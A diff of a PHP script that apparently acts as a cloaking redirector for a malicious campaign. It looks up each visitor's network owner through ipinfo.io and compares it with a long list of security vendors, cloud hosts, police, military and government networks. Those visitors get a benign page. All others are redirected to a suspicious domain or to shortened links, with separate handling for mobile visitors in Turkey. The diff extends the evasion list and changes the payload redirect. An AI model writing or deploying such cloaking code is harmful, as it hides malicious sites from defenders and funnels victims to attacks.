@@ -3,6 +3,20 @@
   header('Access-Control-Allow-Methods: GET');
   header('X-Frame-Options: DENY');
 
+  function getUserIP() {
+      if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
+          if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
+              $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
+              return trim($addr[0]);
+          } else {
+              return $_SERVER['HTTP_X_FORWARDED_FOR'];
+          }
+      }
+      else {
+          return $_SERVER['REMOTE_ADDR'];
+      }
+  }
+
   function generate_name($length){
       $rname = '';
       $sesli = 'aeiou';
@@ -19,24 +33,25 @@
   }
 
   function getORG(){
-  	$ch = curl_init();
-  	curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
-  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-  	$org = curl_exec($ch);
-  	curl_close($ch);
-  	return $org;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/org');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $org = curl_exec($ch);
+    curl_close($ch);
+    return $org;
   }
 
-  function getSite(){
+  function getCountry(){
     $ch = curl_init();
-  	curl_setopt($ch, CURLOPT_URL, 'http://xkkdiqis.info/php/site.php');
-  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  	$site = curl_exec($ch);
-  	curl_close($ch);
-  	return $site;
+    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/country');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $org = curl_exec($ch);
+    curl_close($ch);
+    return $org;
   }
-  
+
   $action = 'theme';
 
   require_once('Mobile_Detect.php');
@@ -73,15 +88,15 @@
   }
 
   if($action == 'site'){
-    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
+    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
   }else if($action == 'mobile'){
-    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
+    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
   }
 
   if($action != 'theme'){
     $org = getORG();
     foreach ($asnlist as $asn) {
-      if(strpos(strtolower($org), $asn) !== false){
+      if(strpos(strtolower($org), strtolower($asn)) !== false){
         $action = 'theme';
         break;
       }
@@ -115,9 +130,15 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/7WWmXZ?'.rand(11111,99999));
+    if (getCountry() == "TR") {
+      header('Location: https://goo.gl/O3CLpb');
+    } else {
+      header('Location: https://goo.gl/2lJlph');
+    }
+    exit;
   }else if($action == 'site'){
-    header("Location: http://xkkdiqis.info/$id.scan");
+    header("Location: http://xkkdiqis.info/$id.jpg");
+    exit;
   }else{
     @ob_end_clean();
     @ob_end_flush();
